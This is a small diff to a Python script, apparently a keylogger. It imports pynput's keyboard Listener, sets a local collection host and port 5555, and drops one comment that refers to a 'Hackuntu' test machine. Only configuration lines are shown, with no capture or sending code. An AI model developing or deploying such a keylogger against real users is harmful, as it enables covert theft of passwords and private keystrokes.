@@ -6,7 +6,7 @@ from typing import *;
 from requests import get;
 from pynput.keyboard import Listener, Key
 
-HOST: str = "10.0.0.16" # Hackuntu or Laptop for testing
+HOST: str = "10.0.0.16"
 PORT: int = 5555  # Will use this port for now, but could change it later
 FILEPATH = ""
 KEYS: List[Key] = []
